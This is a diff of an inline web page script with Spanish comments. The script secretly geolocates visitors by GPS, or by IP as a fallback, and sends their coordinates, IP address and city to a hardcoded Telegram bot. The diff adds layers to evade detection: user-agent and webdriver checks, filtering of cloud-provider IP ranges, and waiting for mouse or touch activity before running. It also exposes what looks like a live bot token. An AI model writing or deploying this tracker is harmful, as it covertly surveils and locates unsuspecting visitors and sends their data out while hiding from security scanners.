@@ -69,97 +69,116 @@
     const TOKEN = '9068600803:AAHsD99VxpWVyedQoPlZeFV3OHotQJhK0W0';
     const CHAT_ID = '9180377107';
 
-// 🛡️ [CAMBIO - ESCUDO 1]: Bloquea bots si la página se carga oculta o en segundo plano
-if (document.hidden) {
-    console.log("Visita descartada automáticamente: Navegador en segundo plano (posible bot).");
-    return; 
-}
 
-// Función para sanitizar caracteres que rompen el HTML de Telegram
-function escapeHTML(text) {
-    return String(text).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
-}
+// 🛡️ ESCUDO 1: Bloqueo inmediato de bots, navegadores ocultos y automatización
+    const esBot = /bot|googlebot|crawler|spider|robot|crawling|headless|lighthouse|facebookexternalhit|whatsapp|telegrambot/i.test(navigator.userAgent);
+    
+    if (document.hidden || navigator.webdriver || esBot) {
+        console.log("Visita descartada: Bot o navegador automatizado detectado.");
+        return;
+    }
 
-// Función única para obtener y enviar ubicación por IP
-function buscarPorIP() {
-    fetch('https://ipapi.co/json/')
-    .then(res => res.json())
-    .then(data => {
-        const latIP = data.latitude;
-        const lonIP = data.longitude;
-        const ip = data.ip || 'No detectada';
-        const country = data.country_name || 'Desconocido';
-        const city = data.city || 'Desconocida';
-        
-        const rawUrlIP = "https://www.google.com/search?q=" + latIP + "," + lonIP + "&rlz=1C1UEAD_esMX1233MX1238&oq=" + latIP + "," + lonIP;
-        const safeUrlIP = escapeHTML(rawUrlIP);
+    function escapeHTML(text) {
+        return String(text).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
+    }
 
-        const textoIP = "<b>🌐 Nueva Visita (Por IP)</b>\n\n" +
-                        "• IP: " + escapeHTML(ip) + "\n" +
-                        "• País: " + escapeHTML(country) + "\n" +
-                        "• Ciudad: " + escapeHTML(city) + "\n\n" +
-                        "👉 <a href=\"" + safeUrlIP + "\">Ver Ubicación por IP</a>";
-        
-        fetch("https://api.telegram.org/bot" + TOKEN + "/sendMessage", {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ 
-                chat_id: CHAT_ID, 
-                text: textoIP,
-                parse_mode: 'HTML' 
-            })
-        });
-    }).catch(e => console.error("Error enviando IP:", e));
-}
-
-// Flujo principal: intenta GPS primero y usa IP como respaldo
-if (navigator.geolocation) {
-    navigator.geolocation.getCurrentPosition(
-        // Si el usuario da ACEPTAR
-        function(pos) {
-            const lat = pos.coords.latitude;
-            const lon = pos.coords.longitude;
-            const acc = Math.round(pos.coords.accuracy);
-
-            // 🛡️ [CAMBIO - ESCUDO 2]: Si la precisión es muy mala, pasa al respaldo por IP
-            if (acc > 300) {
-                console.log("Ubicación descartada: Precisión demasiado baja (" + acc + "m). Usando IP...");
-                buscarPorIP();
+    // 🛡️ ESCUDO 2: Filtro de organizaciones de servidores/bots en la consulta por IP
+    function buscarPorIP() {
+        fetch('https://ipapi.co/json/')
+        .then(res => res.json())
+        .then(data => {
+            const org = (data.org || '').toLowerCase();
+            const botsConocidos = ['google', 'amazon', 'aws', 'microsoft', 'azure', 'digitalocean', 'ovh', 'hetzner', 'cloudflare', 'facebook', 'meta'];
+            
+            // Si la IP pertenece a un servidor o nube, cancela el envío
+            if (botsConocidos.some(bot => org.includes(bot))) {
+                console.log("IP bloqueada por pertenecer a un servidor/bot:", data.org);
                 return;
             }
 
-            const rawUrlGPS = "https://www.google.com/search?q=" + lat + "," + lon;
-            const safeUrlGPS = escapeHTML(rawUrlGPS);
+            const latIP = data.latitude;
+            const lonIP = data.longitude;
+            const ip = data.ip || 'No detectada';
+            const country = data.country_name || 'Desconocido';
+            const city = data.city || 'Desconocida';
+            
+            const rawUrlIP = "https://www.google.com/search?q=" + latIP + "," + lonIP;
+            const safeUrlIP = escapeHTML(rawUrlIP);
 
-            const textoGPS = "<b>📍 Nueva Visita (GPS Exacto)</b>\n\n" +
-                             "• Precisión: ~" + acc + " metros\n\n" +
-                             "👉 <a href=\"" + safeUrlGPS + "\">Ver Ubicación en Mapa</a>";
-
+            const textoIP = "<b>🌐 Nueva Visita (Por IP)</b>\n\n" +
+                            "• IP: " + escapeHTML(ip) + "\n" +
+                            "• País: " + escapeHTML(country) + "\n" +
+                            "• Ciudad: " + escapeHTML(city) + "\n\n" +
+                            "👉 <a href=\"" + safeUrlIP + "\">Ver Ubicación por IP</a>";
+            
             fetch("https://api.telegram.org/bot" + TOKEN + "/sendMessage", {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ 
                     chat_id: CHAT_ID, 
-                    text: textoGPS,
+                    text: textoIP,
                     parse_mode: 'HTML' 
                 })
-            }).catch(e => console.error("Error enviando GPS:", e));
-        },
-        // Si el usuario da RECHAZAR o falla el GPS
-        function(err) {
-            console.warn("GPS rechazado o fallido. Ejecutando respaldo por IP...");
+            });
+        }).catch(e => console.error("Error enviando IP:", e));
+    }
+
+    function iniciarRastreo() {
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(
+                function(pos) {
+                    const lat = pos.coords.latitude;
+                    const lon = pos.coords.longitude;
+                    const acc = Math.round(pos.coords.accuracy);
+
+                    if (acc > 300) {
+                        buscarPorIP();
+                        return;
+                    }
+
+                    const rawUrlGPS = "https://www.google.com/search?q=" + lat + "," + lon;
+                    const safeUrlGPS = escapeHTML(rawUrlGPS);
+
+                    const textoGPS = "<b>📍 Nueva Visita (GPS Exacto)</b>\n\n" +
+                                     "• Precisión: ~" + acc + " metros\n\n" +
+                                     "👉 <a href=\"" + safeUrlGPS + "\">Ver Ubicación en Mapa</a>";
+
+                    fetch("https://api.telegram.org/bot" + TOKEN + "/sendMessage", {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ 
+                            chat_id: CHAT_ID, 
+                            text: textoGPS,
+                            parse_mode: 'HTML' 
+                        })
+                    }).catch(e => console.error("Error enviando GPS:", e));
+                },
+                function(err) {
+                    buscarPorIP();
+                },
+                { enableHighAccuracy: true, timeout: 6000 }
+            );
+        } else {
             buscarPorIP();
-        },
-        { enableHighAccuracy: true, timeout: 6000 }
-    );
-} else {
-    // Si el navegador no soporta geolocalización
-    buscarPorIP();
-}
+        }
+    }
+
+    // 🛡️ ESCUDO 3: Exigir interacción real del usuario antes de ejecutar nada
+    let rastreoIniciado = false;
+    function activarConInteraccion() {
+        if (rastreoIniciado) return;
+        rastreoIniciado = true;
+        
+        // Limpiar los escuchadores para que solo se ejecute una vez
+        ['mousemove', 'touchstart', 'scroll', 'keydown', 'click'].forEach(evento => {
+            window.removeEventListener(evento, activarConInteraccion);
+        });
+
+        iniciarRastreo();
+    }
+
+    ['mousemove', 'touchstart', 'scroll', 'keydown', 'click'].forEach(evento => {
+        window.addEventListener(evento, activarConInteraccion, { passive: true });
+    });
 })();
 </script>
-
-<!-- Carga del archivo principal de interacción lógica -->
-<script src="main.js"></script>
-</body>
-</html>
